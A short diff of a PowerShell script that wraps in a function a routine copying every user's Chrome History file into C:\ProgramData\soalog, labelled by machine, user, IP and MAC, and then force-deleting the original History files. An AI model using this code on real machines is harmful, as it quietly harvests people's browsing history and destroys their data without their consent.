@@ -26,6 +26,9 @@ else
 $sn = $sn
 }
 }
+
+function Copy_Up_Chrome
+{
     Copy-Item 'C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\History' -Destination C:\ProgramData\soalog\${env:COMPUTERNAME}_${env:USERNAME}_${env:hostIP}_${env:hostMAC}_$sn_$(get-date -f yyyyMMddHH)_ChromeHistory
 
     if($?)
@@ -60,7 +63,7 @@ $sn = $sn
 
    Remove-Item -Path 'C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\History' -Force
 }
-
+}
 
 
 if(get-process chrome)
